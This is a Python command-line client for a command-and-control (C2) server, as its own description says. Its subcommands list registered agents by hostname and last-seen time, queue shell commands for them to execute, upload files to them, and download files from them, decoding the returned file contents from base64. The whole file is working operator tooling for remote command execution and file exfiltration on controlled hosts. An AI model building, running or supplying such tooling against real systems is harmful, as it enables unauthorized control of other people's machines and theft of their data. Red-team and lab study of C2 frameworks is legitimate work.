import requests
import sys
import json
import argparse

# Default Server URL
DEFAULT_SERVER_URL = "http://127.0.0.1:8000"
SERVER_URL = DEFAULT_SERVER_URL

def get_server_url():
    return SERVER_URL

def list_agents():
    try:
        response = requests.get(f"{SERVER_URL}/api/agents")
        agents = response.json()
        print(f"\n[*] Active Agents ({len(agents)}):")
        print("-" * 60)
        print(f"{'ID':<38} {'Hostname':<15} {'Last Seen':<20}")
        print("-" * 60)
        for agent in agents:
            print(f"{agent['id']:<38} {agent['hostname']:<15} {agent['last_seen']:<20}")
        print("-" * 60)
    except Exception as e:
        print(f"[-] Error: {e}")

def list_tasks(agent_id):
    try:
        response = requests.get(f"{SERVER_URL}/api/tasks/{agent_id}")
        tasks = response.json()
        print(f"\n[*] Tasks for Agent {agent_id}:")
        for task in tasks:
            print(f"ID: {task['id']} | Command: {task['command']} | Status: {task['status']}")
            if task['status'] == 'completed':
                # Fetch result
                res = requests.get(f"{SERVER_URL}/api/results/{task['id']}")
                if res.status_code == 200:
                    print(f"Output:\n{res.json()['output']}")
            print("-" * 30)
    except Exception as e:
        print(f"[-] Error: {e}")

def queue_task(agent_id, command, args=None):
    data = {
        "command": command,
        "arguments": args
    }
    try:
        response = requests.post(f"{SERVER_URL}/api/tasks/{agent_id}", json=data)
        if response.status_code == 200:
            print(f"[+] Task queued successfully. Task ID: {response.json()['id']}")
        else:
            print(f"[-] Failed to queue task: {response.text}")
    except Exception as e:
        print(f"[-] Error: {e}")

def get_agent_id(last=False):
    try:
        response = requests.get(f"{SERVER_URL}/api/agents")
        agents = response.json()
        if agents:
            print(agents[-1]['id'] if last else agents[0]['id'])
        else:
            print("No agents found")
    except Exception as e:
        print(f"[-] Error: {e}")

def upload_file(agent_id, local_file, remote_path):
    try:
        import base64
        with open(local_file, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        queue_task(agent_id, "upload", f"{remote_path} {content}")
    except Exception as e:
        print(f"[-] Error reading file: {e}")

def download_file(agent_id, remote_path, local_file):
    queue_task(agent_id, "download", remote_path)
    print(f"[*] Queued download task. Run 'tasks {agent_id}' to check status.")

def get_file_content(task_id, local_file):
    try:
        res = requests.get(f"{SERVER_URL}/api/results/{task_id}")
        if res.status_code == 200:
            content = res.json()['output']
            import base64
            with open(local_file, "wb") as f:
                f.write(base64.b64decode(content))
            print(f"[+] File saved to {local_file}")
        else:
            print("[-] Result not found or pending")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    global SERVER_URL
    
    parser = argparse.ArgumentParser(description="C2 Client CLI")
    parser.add_argument("--url", default=DEFAULT_SERVER_URL, help="C2 Server URL")
    
    subparsers = parser.add_subparsers(dest="command", help="Commands")
    
    # Agents command
    subparsers.add_parser("agents", help="List active agents")
    
    # Tasks command
    tasks_parser = subparsers.add_parser("tasks", help="List tasks for an agent")
    tasks_parser.add_argument("agent_id", help="Agent ID")
    
    # Exec command
    exec_parser = subparsers.add_parser("exec", help="Execute a command on an agent")
    exec_parser.add_argument("agent_id", help="Agent ID")
    exec_parser.add_argument("cmd", help="Command to execute")
    exec_parser.add_argument("args", nargs=argparse.REMAINDER, help="Arguments for the command")
    
    # Get ID commands
    subparsers.add_parser("get-id", help="Get the first agent ID")
    subparsers.add_parser("get-last-id", help="Get the last agent ID")
    
    # Upload command
    upload_parser = subparsers.add_parser("upload", help="Upload a file to an agent")
    upload_parser.add_argument("agent_id", help="Agent ID")
    upload_parser.add_argument("local_file", help="Local file path")
    upload_parser.add_argument("remote_path", help="Remote file path")
    
    # Download command
    download_parser = subparsers.add_parser("download", help="Download a file from an agent")
    download_parser.add_argument("agent_id", help="Agent ID")
    download_parser.add_argument("remote_path", help="Remote file path")
    download_parser.add_argument("local_file", help="Local file path to save")
    
    # Get File command
    get_file_parser = subparsers.add_parser("get-file", help="Get a downloaded file from a task result")
    get_file_parser.add_argument("task_id", help="Task ID")
    get_file_parser.add_argument("local_file", help="Local file path to save")

    args = parser.parse_args()
    
    SERVER_URL = args.url
    
    if args.command == "agents":
        list_agents()
    elif args.command == "tasks":
        list_tasks(args.agent_id)
    elif args.command == "exec":
        cmd_args = " ".join(args.args) if args.args else None
        queue_task(args.agent_id, "shell", f"{args.cmd} {cmd_args}" if cmd_args else args.cmd)
    elif args.command == "get-id":
        get_agent_id(last=False)
    elif args.command == "get-last-id":
        get_agent_id(last=True)
    elif args.command == "upload":
        upload_file(args.agent_id, args.local_file, args.remote_path)
    elif args.command == "download":
        download_file(args.agent_id, args.remote_path, args.local_file)
    elif args.command == "get-file":
        get_file_content(args.task_id, args.local_file)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
